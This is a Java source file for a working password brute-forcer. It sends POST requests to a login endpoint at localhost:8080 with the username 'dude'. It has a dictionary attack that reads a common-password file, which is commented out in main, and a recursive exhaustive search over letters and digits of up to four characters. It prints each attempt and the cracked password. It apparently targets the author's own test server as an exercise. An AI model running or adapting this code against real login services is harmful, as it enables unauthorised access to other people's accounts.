import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.ThreadLocalRandom;

public class Main {

    static int count = 0;
    static String username = "dude";


    private static String sendPOST(String username, String password) throws IOException {
        String POST_PARAMS = "username=" + username + "&password=" + password;
        String POST_URL = "http://localhost:8080/loginValidate";
        URL url = new URL(POST_URL);
        HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
        httpURLConnection.setRequestMethod("POST");

        httpURLConnection.setDoOutput(true);
        OutputStream outputStream = httpURLConnection.getOutputStream();
        outputStream.write(POST_PARAMS.getBytes());
        outputStream.flush();
        outputStream.close();

        int responseCode = httpURLConnection.getResponseCode();
        System.out.println("POST Response Code :" + responseCode);

        if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            if (response.toString().contains("welcome")) {
                //System.out.println("success");
                return "success";
            } else {
                //System.out.println("denied");
                return "denied";
            }
            //System.out.println(response);
        } else {
            System.out.println("POST request did not worked");
        }
        return "wtf happened?";
    }

    private static List<String> getPasswordList() throws FileNotFoundException {

        File file = new File("src/commonPasswords.txt");
        Scanner scanner = new Scanner(new FileReader(file));
        List<String> passwordList = new ArrayList<>();
        while (scanner.hasNextLine()) {
            passwordList.add(scanner.nextLine());
        }
        return passwordList;
    }

    private static boolean MrBrutesDictionary() throws IOException {
        List<String> passwordList = getPasswordList();
        String response;

        for (String p : passwordList) {
            response = sendPOST(username, p);
            count++;
            System.out.println("TRIED: " + p + " - COUNT: " + count);
            if (response.equals("success")) {
                System.out.println("Password is: " + p + "\nAnd it took :" + count + " times");
                return true;
            }
        }
        System.out.println("Cannot crack password");
        return false;
    }

    private static boolean msBrute(String testWord, String chars) throws IOException {

        if(testWord.length() < 4) {

            for (int i = 0; i < chars.length(); i++){
                char cha = chars.charAt(i);
                String currentWordTested = testWord + cha;
                count++;

                System.out.println("TRIED: " + currentWordTested + " - COUNT: " + count);
                if(sendPOST(username,currentWordTested).equals("success")) {
                    System.out.println("Password is: " + currentWordTested + "\nAnd it took :" + count + " times");
                    return true;
                }
                if(msBrute(currentWordTested,chars)) {
                    return true;
                }
            }
        }
        return false;
    }

    public static void main(String[] args) throws IOException {
        String lowerCase = "abcdefghijklmnopqrstuvwxyz";
        String upperCase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        String numbers = "1234567890";

        /*
        if (MrBrutesDictionary()){
            System.exit(0);
        }*/
        if (msBrute("", lowerCase)){
            System.exit(0);
        }
        if (msBrute("", upperCase)){
            System.exit(0);
        }
        if (msBrute("", numbers)){
            System.exit(0);
        }
    }

}